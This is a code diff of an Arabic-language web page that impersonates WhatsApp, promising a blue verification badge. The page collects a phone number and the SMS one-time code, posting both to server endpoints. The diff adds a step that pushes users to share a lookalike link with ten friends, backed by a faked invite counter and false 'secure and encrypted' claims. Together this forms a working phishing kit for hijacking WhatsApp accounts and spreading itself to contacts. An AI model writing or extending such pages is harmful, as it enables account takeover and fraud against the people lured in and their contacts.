@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp - توثيق الحساب</title>
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -48,19 +47,6 @@
             top: 0;
             z-index: 10;
             min-height: 60px;
-        }
-
-        .header .back-btn {
-            font-size: 22px;
-            cursor: pointer;
-            display: none;
-            padding: 4px 8px;
-            border-radius: 50%;
-            transition: 0.2s;
-        }
-
-        .header .back-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
         }
 
         .header .brand {
@@ -117,6 +103,7 @@
             }
         }
 
+        /* ===== الصفحات ===== */
         .page {
             flex: 1;
             padding: 30px 24px;
@@ -142,114 +129,67 @@
             }
         }
 
-        .chat-card {
+        /* ===== بطاقة الدعوة ===== */
+        .invite-card {
             background: white;
             border-radius: 16px;
-            padding: 24px 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
-        }
-
-        .chat-card .icon-circle {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #e8f5e9;
-            color: #075e54;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            margin: 0 auto 12px;
-        }
-
-        .chat-card h3 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            text-align: center;
-            margin-bottom: 4px;
-        }
-
-        .chat-card .sub-text {
-            color: #667781;
-            font-size: 14px;
-            text-align: center;
-            line-height: 1.5;
-        }
-
-        .chat-card .sub-text strong {
-            color: #075e54;
-        }
-
-        .input-group {
-            display: flex;
-            align-items: center;
-            background: white;
-            border-radius: 12px;
-            padding: 4px 16px;
+            padding: 30px 24px;
             margin-bottom: 16px;
-            border: 2px solid #e9edef;
-            transition: 0.2s;
-        }
-
-        .input-group:focus-within {
-            border-color: #075e54;
-            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
-        }
-
-        .input-group i {
-            color: #667781;
-            font-size: 18px;
-            margin-left: 12px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 0;
-            border: none;
-            background: transparent;
-            font-size: 16px;
-            outline: none;
-            direction: ltr;
-            color: #1a1a1a;
-        }
-
-        .input-group input::placeholder {
-            color: #8696a0;
-        }
-
-        .otp-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 16px 0 20px;
-            direction: ltr;
-        }
-
-        .otp-boxes input {
-            width: 48px;
-            height: 56px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
             text-align: center;
-            font-size: 22px;
+        }
+
+        .invite-card .icon-circle {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: #dcf8c6;
+            color: #075e54;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 16px;
+        }
+
+        .invite-card h3 {
+            font-size: 20px;
             font-weight: 700;
-            border: 2px solid #e9edef;
-            border-radius: 12px;
-            background: white;
-            transition: 0.2s;
-            outline: none;
             color: #1a1a1a;
-            -webkit-text-security: none;
+            margin-bottom: 8px;
         }
 
-        .otp-boxes input:focus {
-            border-color: #075e54;
-            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
+        .invite-card .sub-text {
+            color: #667781;
+            font-size: 15px;
+            line-height: 1.6;
         }
 
-        .btn {
+        .invite-card .sub-text strong {
+            color: #075e54;
+        }
+
+        .invite-card .highlight-box {
+            background: #f0f7ff;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px 0 20px;
+            border-right: 4px solid #075e54;
+            text-align: right;
+        }
+
+        .invite-card .highlight-box .number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #075e54;
+        }
+
+        /* ===== زر نسخ الرابط ===== */
+        .copy-btn {
             width: 100%;
             padding: 14px;
+            background: #075e54;
+            color: white;
             border: none;
             border-radius: 30px;
             font-size: 16px;
@@ -259,121 +199,22 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
         }
 
-        .btn-primary {
-            background: #075e54;
-            color: white;
-        }
-
-        .btn-primary:hover {
+        .copy-btn:hover {
             background: #054a42;
         }
 
-        .btn-primary:active {
+        .copy-btn:active {
             transform: scale(0.97);
         }
 
-        .btn-success {
+        .copy-btn.copied {
             background: #25d366;
-            color: white;
         }
 
-        .btn-success:hover {
-            background: #1da85c;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: #075e54;
-            border: 2px solid #075e54;
-        }
-
-        .btn-secondary:hover {
-            background: #075e54;
-            color: white;
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .error-msg {
-            color: #d32f2f;
-            font-size: 13px;
-            margin: -8px 0 14px 0;
-            display: none;
-            align-items: center;
-            gap: 6px;
-            background: #fce4ec;
-            padding: 8px 14px;
-            border-radius: 10px;
-        }
-
-        .error-msg.show {
-            display: flex;
-        }
-
-        .success-msg {
-            color: #1da85c;
-            font-size: 13px;
-            margin: -8px 0 14px 0;
-            display: none;
-            align-items: center;
-            gap: 6px;
-            background: #e8f5e9;
-            padding: 8px 14px;
-            border-radius: 10px;
-        }
-
-        .success-msg.show {
-            display: flex;
-        }
-
-        .footer-note {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8696a0;
-            padding: 10px 0;
-        }
-
-        .footer-note i {
-            color: #25d366;
-            margin-right: 4px;
-        }
-
-        .loading-spinner {
-            display: none;
-            text-align: center;
-            padding: 10px;
-        }
-
-        .loading-spinner.show {
-            display: block;
-        }
-
-        .spinner {
-            border: 3px solid #e9edef;
-            border-top: 3px solid #075e54;
-            border-radius: 50%;
-            width: 28px;
-            height: 28px;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
+        /* ===== رسائل ===== */
         .message-bubble {
             background: white;
             border-radius: 16px 16px 16px 4px;
@@ -409,16 +250,92 @@
             background: #e8f5e9;
         }
 
+        .message-bubble.incoming .text {
+            color: #1a1a1a;
+        }
+
+        /* ===== تذييل ===== */
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8696a0;
+            padding: 10px 0;
+        }
+
+        .footer-note i {
+            color: #25d366;
+            margin-right: 4px;
+        }
+
+        /* ===== Toast ===== */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a1a;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            z-index: 100;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+        }
+
+        .toast.show {
+            display: block;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        /* ===== Progress Bar ===== */
+        .progress-container {
+            margin: 16px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9edef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 6px;
+        }
+
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #075e54, #25d366);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #667781;
+        }
+
+        /* ===== Responsive ===== */
         @media (max-width: 430px) {
             .app-container {
                 max-height: 100vh;
                 border-radius: 0;
                 box-shadow: none;
-            }
-            .otp-boxes input {
-                width: 44px;
-                height: 50px;
-                font-size: 20px;
             }
         }
 
@@ -432,6 +349,34 @@
             background: #c8c8c8;
             border-radius: 10px;
         }
+
+        /* ===== زر المتابعة ===== */
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-continue:hover {
+            background: #1da85c;
+        }
+
+        .btn-continue:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -440,7 +385,6 @@
 
         <!-- ======== الهيدر ======== -->
         <div class="header">
-            <i id="backBtn" class="back-btn fas fa-arrow-left"></i>
             <div class="brand">
                 <i class="fab fa-whatsapp"></i>
                 <h2>WhatsApp</h2>
@@ -452,8 +396,70 @@
             </div>
         </div>
 
-        <!-- ======== الصفحة 1: رقم الهاتف ======== -->
-        <div id="pagePhone" class="page active">
+        <!-- ======== صفحة الدعوة (الجديدة) ======== -->
+        <div id="pageInvite" class="page active">
+            <div class="invite-card">
+                <div class="icon-circle">
+                    <i class="fas fa-user-friends"></i>
+                </div>
+                <h3>🎯 توثيق الحساب</h3>
+                <p class="sub-text">
+                    <strong>لتفعيل التوثيق والحصول على العلامة الزرقاء</strong>
+                    <br>يجب عليك مشاركة الرابط مع <strong>10 من أصدقائك</strong>
+                </p>
+
+                <div class="highlight-box">
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <span style="font-size: 14px; color: #667781;">عدد المدعوين</span>
+                        <span class="number" id="inviteCount">0</span>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-label">
+                            <span>0</span>
+                            <span>10</span>
+                        </div>
+                        <div class="progress-bar">
+                            <div class="fill" id="progressFill" style="width: 0%;"></div>
+                        </div>
+                    </div>
+                    <p style="font-size: 13px; color: #667781; margin-top: 4px;">
+                        <i class="fas fa-info-circle"></i>
+                        كل صديق يفتح الرابط يحسب لك دعوة
+                    </p>
+                </div>
+
+                <button class="copy-btn" id="copyLinkBtn">
+                    <i class="fas fa-copy"></i>
+                    نسخ رابط الدعوة
+                </button>
+
+                <button class="btn-continue" id="continueBtn" disabled>
+                    <i class="fas fa-arrow-right"></i>
+                    المتابعة للتوثيق
+                </button>
+
+                <div class="footer-note">
+                    <i class="fas fa-shield-alt"></i>
+                    الرابط آمن ومشفّر
+                </div>
+            </div>
+
+            <!-- رسائل واتساب -->
+            <div class="message-bubble incoming">
+                <div class="sender">WhatsApp</div>
+                <div class="text">👋 مرحباً! شارك الرابط مع 10 أصدقاء لتفعيل التوثيق</div>
+                <div class="time">الآن</div>
+            </div>
+
+            <div class="message-bubble incoming" id="progressMsg" style="display: none;">
+                <div class="sender">WhatsApp</div>
+                <div class="text">✅ تمت دعوة <span id="progressText">0</span> من 10 أصدقاء</div>
+                <div class="time">الآن</div>
+            </div>
+        </div>
+
+        <!-- ======== الصفحة 2: رقم الهاتف ======== -->
+        <div id="pagePhone" class="page">
             <div class="chat-card">
                 <div class="icon-circle">
                     <i class="fas fa-shield-alt"></i>
@@ -465,34 +471,26 @@
                 </p>
             </div>
 
-            <div class="message-bubble incoming">
-                <div class="sender">WhatsApp</div>
-                <div class="text">🔒 حسابك سيصبح موثقاً رسمياً بعد التحقق</div>
-                <div class="time">الآن</div>
+            <div class="input-group">
+                <i class="fas fa-phone-alt"></i>
+                <input type="tel" id="phoneInput" placeholder="أدخل رقم الهاتف" maxlength="15" inputmode="numeric" pattern="[0-9]*">
             </div>
 
-            <div style="margin-top: 16px;">
-                <div class="input-group">
-                    <i class="fas fa-phone-alt"></i>
-                    <input type="tel" id="phoneInput" placeholder="أدخل رقم الهاتف" maxlength="15" inputmode="numeric" pattern="[0-9]*">
-                </div>
+            <div id="phoneError" class="error-msg">
+                <i class="fas fa-exclamation-circle"></i>
+                <span>يرجى إدخال رقم هاتف صحيح</span>
+            </div>
 
-                <div id="phoneError" class="error-msg">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <span>يرجى إدخال رقم هاتف صحيح</span>
-                </div>
+            <button class="btn btn-primary" id="sendOtpBtn">
+                <i class="fas fa-paper-plane"></i> طلب رمز التوثيق
+            </button>
 
-                <button class="btn btn-primary" id="sendOtpBtn">
-                    <i class="fas fa-paper-plane"></i> طلب رمز التوثيق
-                </button>
-
-                <div class="footer-note">
-                    <i class="fas fa-lock"></i> معلوماتك آمنة ومشفرة
-                </div>
+            <div class="footer-note">
+                <i class="fas fa-lock"></i> معلوماتك آمنة ومشفرة
             </div>
         </div>
 
-        <!-- ======== الصفحة 2: إدخال OTP ======== -->
+        <!-- ======== الصفحة 3: OTP ======== -->
         <div id="pageOtp" class="page">
             <div class="chat-card">
                 <div class="icon-circle">
@@ -503,12 +501,6 @@
                     تم إرسال رمز مكون من 6 أرقام إلى
                     <br><strong id="displayPhone">رقمك</strong>
                 </p>
-            </div>
-
-            <div class="message-bubble incoming">
-                <div class="sender">WhatsApp</div>
-                <div class="text">📱 أدخل الرمز الذي تلقيته</div>
-                <div class="time">الآن</div>
             </div>
 
             <div class="otp-boxes" id="otpContainer">
@@ -551,21 +543,35 @@
 
     </div>
 
+    <!-- ======== Toast ======== -->
+    <div id="toast" class="toast"></div>
+
     <script>
         // =============================================
         //  جافا سكريبت - التحكم في الصفحات والمنطق
         // =============================================
 
-        // عناصر الصفحة
+        // عناصر الصفحات
+        const pageInvite = document.getElementById('pageInvite');
         const pagePhone = document.getElementById('pagePhone');
         const pageOtp = document.getElementById('pageOtp');
-        const backBtn = document.getElementById('backBtn');
 
+        // عناصر صفحة الدعوة
+        const copyBtn = document.getElementById('copyLinkBtn');
+        const continueBtn = document.getElementById('continueBtn');
+        const inviteCount = document.getElementById('inviteCount');
+        const progressFill = document.getElementById('progressFill');
+        const progressMsg = document.getElementById('progressMsg');
+        const progressText = document.getElementById('progressText');
+        const toast = document.getElementById('toast');
+
+        // عناصر صفحة الهاتف
         const phoneInput = document.getElementById('phoneInput');
         const phoneError = document.getElementById('phoneError');
         const sendOtpBtn = document.getElementById('sendOtpBtn');
-
         const displayPhone = document.getElementById('displayPhone');
+
+        // عناصر صفحة OTP
         const otpInputs = document.querySelectorAll('.otp-input');
         const otpError = document.getElementById('otpError');
         const otpSuccess = document.getElementById('otpSuccess');
@@ -573,24 +579,89 @@
         const resendOtpBtn = document.getElementById('resendOtpBtn');
         const loadingSpinner = document.getElementById('loadingSpinner');
 
+        // متغيرات
         let enteredPhone = '';
         let correctOtp = '123456';
         let isVerifying = false;
+        let inviteCounter = 0;
+        const TARGET_INVITES = 10;
+        const LINK = 'https://whatsapp-verify-zeta.vercel.app/';
 
-        // ===== 1. التبديل بين الصفحات =====
-        function showPage(page) {
-            pagePhone.classList.remove('active');
-            pageOtp.classList.remove('active');
-            page.classList.add('active');
+        // ===== إظهار Toast =====
+        function showToast(message) {
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
 
-            if (page === pageOtp) {
-                backBtn.style.display = 'inline-block';
+        // ===== تحديث عداد الدعوات =====
+        function updateInviteProgress() {
+            inviteCount.textContent = inviteCounter;
+            const percent = Math.min((inviteCounter / TARGET_INVITES) * 100, 100);
+            progressFill.style.width = percent + '%';
+            
+            if (inviteCounter >= TARGET_INVITES) {
+                continueBtn.disabled = false;
+                progressMsg.style.display = 'block';
+                progressText.textContent = inviteCounter;
             } else {
-                backBtn.style.display = 'none';
+                continueBtn.disabled = true;
+                progressMsg.style.display = 'block';
+                progressText.textContent = inviteCounter;
             }
         }
 
-        // ===== 2. إرسال الرقم (الصفحة 1 → 2) =====
+        // ===== نسخ الرابط =====
+        async function copyLink() {
+            try {
+                await navigator.clipboard.writeText(LINK);
+                showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
+                copyBtn.classList.add('copied');
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> تم النسخ!';
+                
+                // محاكاة زيادة العداد (للتجربة)
+                inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
+                updateInviteProgress();
+                
+                setTimeout(() => {
+                    copyBtn.classList.remove('copied');
+                    copyBtn.innerHTML = '<i class="fas fa-copy"></i> نسخ رابط الدعوة';
+                }, 3000);
+            } catch (err) {
+                // Fallback للهواتف القديمة
+                const textArea = document.createElement('textarea');
+                textArea.value = LINK;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
+                
+                inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
+                updateInviteProgress();
+            }
+        }
+
+        // ===== المتابعة =====
+        function goToPhone() {
+            if (inviteCounter >= TARGET_INVITES) {
+                pageInvite.classList.remove('active');
+                pagePhone.classList.add('active');
+                phoneInput.focus();
+            }
+        }
+
+        // ===== التبديل بين الصفحات =====
+        function showPage(page) {
+            pageInvite.classList.remove('active');
+            pagePhone.classList.remove('active');
+            pageOtp.classList.remove('active');
+            page.classList.add('active');
+        }
+
+        // ===== إرسال رقم الهاتف =====
         async function sendPhone() {
             const phone = phoneInput.value.trim().replace(/\s/g, '');
 
@@ -603,24 +674,17 @@
             enteredPhone = phone;
             displayPhone.textContent = phone;
 
-            // توليد OTP عشوائي
             correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
             console.log('📲 رمز OTP الجديد:', correctOtp);
 
-            // ===== إرسال رقم الهاتف فوراً =====
             try {
-                const response = await fetch('/send-phone', {
+                await fetch('/send-phone', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone: phone })
                 });
-                
-                const data = await response.json();
-                console.log('✅ تم إرسال الرقم:', data);
             } catch (error) {
-                console.error('❌ خطأ في إرسال الرقم:', error);
+                console.error('❌ خطأ:', error);
             }
 
             showPage(pageOtp);
@@ -630,7 +694,7 @@
             clearOtpInputs();
         }
 
-        // ===== 3. التحقق من OTP =====
+        // ===== التحقق من OTP =====
         async function verifyOtp() {
             if (isVerifying) return;
 
@@ -654,12 +718,9 @@
             verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
 
             try {
-                // ===== إرسال OTP =====
                 const response = await fetch('/submit-otp', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         phone: enteredPhone,
                         otp: enteredOtp
@@ -667,7 +728,6 @@
                 });
 
                 const data = await response.json();
-                console.log('✅ تم إرسال OTP:', data);
 
                 if (enteredOtp === correctOtp) {
                     otpSuccess.classList.add('show');
@@ -697,7 +757,7 @@
             isVerifying = false;
         }
 
-        // ===== 4. إعادة إرسال الرمز =====
+        // ===== إعادة إرسال الرمز =====
         function resendOtp() {
             correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
             console.log('📲 رمز توثيق جديد:', correctOtp);
@@ -710,12 +770,12 @@
             alert('✅ تم إعادة إرسال الرمز الجديد إلى ' + enteredPhone);
         }
 
-        // ===== 5. مسح خانات OTP =====
+        // ===== مسح خانات OTP =====
         function clearOtpInputs() {
             otpInputs.forEach(input => input.value = '');
         }
 
-        // ===== 6. التنقل التلقائي بين خانات OTP =====
+        // ===== التنقل التلقائي بين خانات OTP =====
         otpInputs.forEach((input, index) => {
             input.addEventListener('keydown', function(e) {
                 const key = e.key;
@@ -744,20 +804,9 @@
             });
         });
 
-        // ===== 7. أزرار العودة =====
-        backBtn.addEventListener('click', function() {
-            showPage(pagePhone);
-            clearOtpInputs();
-            otpError.classList.remove('show');
-            otpSuccess.classList.remove('show');
-            phoneInput.focus();
-            isVerifying = false;
-            loadingSpinner.classList.remove('show');
-            verifyOtpBtn.disabled = false;
-            verifyOtpBtn.innerHTML = '<i class="fas fa-check-circle"></i> تحقق من الرمز';
-        });
-
-        // ===== 8. ربط الأحداث =====
+        // ===== ربط الأحداث =====
+        copyBtn.addEventListener('click', copyLink);
+        continueBtn.addEventListener('click', goToPhone);
         sendOtpBtn.addEventListener('click', sendPhone);
         verifyOtpBtn.addEventListener('click', verifyOtp);
         resendOtpBtn.addEventListener('click', resendOtp);
@@ -776,8 +825,9 @@
             }
         });
 
+        // ===== تهيئة =====
+        updateInviteProgress();
         console.log('🔑 الرمز الافتراضي للاختبار: 123456');
-        console.log('💡 سيتم توليد رمز عشوائي عند إرسال الرقم');
     </script>
 
 </body>
